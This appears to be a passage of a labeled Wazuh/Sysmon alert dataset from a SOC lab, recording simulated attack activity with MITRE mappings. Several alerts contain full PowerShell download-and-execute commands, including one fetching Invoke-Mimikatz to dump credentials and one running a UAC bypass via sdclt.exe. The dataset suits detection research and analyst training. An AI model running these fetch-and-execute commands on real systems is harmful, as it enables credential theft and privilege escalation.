\\\"%%TEMP%%\\\\test.bin\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 19:08:27.383\r\nProcessGuid: {ff3427f9-26ab-6868-0202-000000001400}\r\nProcessId: 10208\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c echo \"Hello from the Windows Command Prompt!\" > \"%%TEMP%%\\test.bin\" & type \"%%TEMP%%\\test.bin\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T19:08:27.3853948Z", "eventRecordID": "148794", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751656108.54805373", "timestamp": "2025-07-04T19:08:28.217+0000"}, "fields": {"timestamp": ["2025-07-04T19:08:28.217Z"]}, "sort": [1751656108217]}}
{"id": "oRfW1pcB1Hp-jZ7f_anC", "description": "Powershell process spawned powershell instance", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "oRfW1pcB1Hp-jZ7f_anC", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-26a4-6868-f801-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "9808", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 19:08:20.471", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" &amp; {if (test-path \\\\\\\"\\\"C:\\\\AtomicRedTeam\\\\atomics\\\\..\\\\ExternalPayloads\\\\T1059_003note.txt\\\\\\\"\\\"){exit 0} else {exit 1}}", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2025-07-04 19:08:20.471\r\nProcessGuid: {ff3427f9-26a4-6868-f801-000000001400}\r\nProcessId: 9808\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {if (test-path \\\"\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\T1059_003note.txt\\\"\"){exit 0} else {exit 1}} \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T19:08:20.4733347Z", "eventRecordID": "148717", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 5, "mail": false, "description": "Powershell process spawned powershell instance", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["PowerShell"], "id": ["T1059.001"], "tactic": ["Execution"]}, "id": "92027"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751656101.54782706", "timestamp": "2025-07-04T19:08:21.531+0000"}, "fields": {"timestamp": ["2025-07-04T19:08:21.531Z"]}, "sort": [1751656101531]}}
{"id": "lxca15cB1Hp-jZ7fRKyv", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "lxca15cB1Hp-jZ7fRKyv", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-37d9-6868-a802-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "3676", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:21:45.956", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c powershell.exe \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 20:21:45.956\r\nProcessGuid: {ff3427f9-37d9-6868-a802-000000001400}\r\nProcessId: 3676\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:21:45.9668448Z", "eventRecordID": "150745", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660506.57778142", "timestamp": "2025-07-04T20:21:46.870+0000"}, "fields": {"timestamp": ["2025-07-04T20:21:46.870Z"]}, "sort": [1751660506870]}}
{"id": "KBca15cB1Hp-jZ7fi60N", "description": "Suspicious file compression activity by powershell: C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\20250704222204_BloodHound.zip", "label": "TP", "rule_level": 14, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "KBca15cB1Hp-jZ7fi60N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "processGuid": "{ff3427f9-37eb-6868-ad02-000000001400}", "processId": "7896", "utcTime": "2025-07-04 20:22:07.692", "targetFilename": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\20250704222204_BloodHound.zip", "ruleName": "technique_id=T1047,technique_name=File System Permissions Weakness", "creationUtcTime": "2025-07-04 20:22:07.692", "user": "SOCLAB\\\\snell"}, "system": {"eventID": "11", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"File created:\r\nRuleName: technique_id=T1047,technique_name=File System Permissions Weakness\r\nUtcTime: 2025-07-04 20:22:07.692\r\nProcessGuid: {ff3427f9-37eb-6868-ad02-000000001400}\r\nProcessId: 7896\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\snell\\AppData\\Local\\Temp\\20250704222204_BloodHound.zip\r\nCreationUtcTime: 2025-07-04 20:22:07.692\r\nUser: SOCLAB\\snell\"", "version": "2", "systemTime": "2025-07-04T20:22:07.6933576Z", "eventRecordID": "150958", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "11", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": true, "description": "Suspicious file compression activity by powershell: C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\20250704222204_BloodHound.zip", "groups": ["sysmon", "sysmon_eid11_detections", "windows"], "mitre": {"technique": ["Ingress Tool Transfer"], "id": ["T1105"], "tactic": ["Command and Control"]}, "id": "92212"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660528.58174122", "timestamp": "2025-07-04T20:22:08.845+0000"}, "fields": {"timestamp": ["2025-07-04T20:22:08.845Z"]}, "sort": [1751660528845]}}
{"id": "MRca15cB1Hp-jZ7fmq2z", "description": "LDAP activity from Powershell process, possible remote system discovery", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "MRca15cB1Hp-jZ7fmq2z", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"destinationPort": "389", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "sourcePort": "50255", "initiated": "true", "destinationIp": "10.0.2.12", "protocol": "tcp", "processGuid": "{ff3427f9-37eb-6868-ad02-000000001400}", "sourceIp": "10.0.2.14", "processId": "7896", "utcTime": "2025-07-04 20:22:06.324", "ruleName": "technique_id=T1059.001,technique_name=PowerShell", "destinationIsIpv6": "false", "user": "SOCLAB\\\\snell", "sourceIsIpv6": "false"}, "system": {"eventID": "3", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Network connection detected:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-07-04 20:22:06.324\r\nProcessGuid: {ff3427f9-37eb-6868-ad02-000000001400}\r\nProcessId: 7896\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nUser: SOCLAB\\snell\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.0.2.14\r\nSourceHostname: -\r\nSourcePort: 50255\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.0.2.12\r\nDestinationHostname: -\r\nDestinationPort: 389\r\nDestinationPortName: -\"", "version": "5", "systemTime": "2025-07-04T20:22:10.3107145Z", "eventRecordID": "150970", "threadID": "4000", "computer": "Win11Client.soclab.internal", "task": "3", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 28, "mail": false, "description": "LDAP activity from Powershell process, possible remote system discovery", "groups": ["sysmon", "sysmon_eid3_detections", "windows"], "mitre": {"technique": ["Remote System Discovery"], "id": ["T1018"], "tactic": ["Discovery"]}, "id": "92103"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660531.58204677", "timestamp": "2025-07-04T20:22:11.800+0000"}, "fields": {"timestamp": ["2025-07-04T20:22:11.800Z"]}, "sort": [1751660531800]}}
{"id": "TBcc15cB1Hp-jZ7fiq3i", "description": "Powershell process spawned Windows command shell instance", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "TBcc15cB1Hp-jZ7fiq3i", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-386c-6868-b402-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "2252", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:24:12.255", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c Powershell.exe \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\\\Windows\\\\System32\\\\cmd.exe'\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 20:24:12.255\r\nProcessGuid: {ff3427f9-386c-6868-b402-000000001400}\r\nProcessId: 2252\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:24:12.2571925Z", "eventRecordID": "151065", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Powershell process spawned Windows command shell instance", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92004"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660653.58300170", "timestamp": "2025-07-04T20:24:13.740+0000"}, "fields": {"timestamp": ["2025-07-04T20:24:13.740Z"]}, "sort": [1751660653740]}}
{"id": "Thcc15cB1Hp-jZ7fiq3i", "description": "Windows backup and restore tool sdclt.exe launched via C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe with High integrity level", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "Thcc15cB1Hp-jZ7fiq3i", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "sdclt.exe", "image": "C:\\\\Windows\\\\System32\\\\sdclt.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-386c-6868-b602-000000001400}", "description": "Microsoft\u00ae Windows Backup", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "Powershell.exe  \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\\\Windows\\\\System32\\\\cmd.exe'\\\"", "processGuid": "{ff3427f9-386d-6868-b702-000000001400}", "logonId": "0xa45f0", "parentProcessId": "8912", "processId": "3360", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:24:13.624", "hashes": "SHA1=8AC6E663FD91342954F67435E25E017726D28B1D,MD5=3813C8CC7C29B96A9B87018DA326D97B,SHA256=1BB9A6F923B3BA8AA26A935A3B92F563CECEA3668C6085768AC33FC703C1F5EB,IMPHASH=43F4450BA53BDDAE70F4D46494FCF21D", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\sdclt.exe\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.3912 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2025-07-04 20:24:13.624\r\nProcessGuid: {ff3427f9-386d-6868-b702-000000001400}\r\nProcessId: 3360\r\nImage: C:\\Windows\\System32\\sdclt.exe\r\nFileVersion: 10.0.26100.3912 (WinBuild.160101.0800)\r\nDescription: Microsoft\u00ae Windows Backup\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: sdclt.exe\r\nCommandLine: \"C:\\WINDOWS\\system32\\sdclt.exe\" \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8AC6E663FD91342954F67435E25E017726D28B1D,MD5=3813C8CC7C29B96A9B87018DA326D97B,SHA256=1BB9A6F923B3BA8AA26A935A3B92F563CECEA3668C6085768AC33FC703C1F5EB,IMPHASH=43F4450BA53BDDAE70F4D46494FCF21D\r\nParentProcessGuid: {ff3427f9-386c-6868-b602-000000001400}\r\nParentProcessId: 8912\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: Powershell.exe  \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:24:13.6412324Z", "eventRecordID": "151087", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Windows backup and restore tool sdclt.exe launched via C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe with High integrity level", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Abuse Elevation Control Mechanism", "Windows Command Shell"], "id": ["T1548", "T1059.003"], "tactic": ["Privilege Escalation", "Defense Evasion", "Execution"]}, "id": "92061"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660655.58310380", "timestamp": "2025-07-04T20:24:15.049+0000"}, "fields": {"timestamp": ["2025-07-04T20:24:15.049Z"]}, "sort": [1751660655049]}}
{"id": "Txcc15cB1Hp-jZ7fjq3J", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "Txcc15cB1Hp-jZ7fjq3J", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-3873-6868-bb02-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "10000", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:24:19.085", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c powershell.exe -exec bypass -noprofile \\\"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": 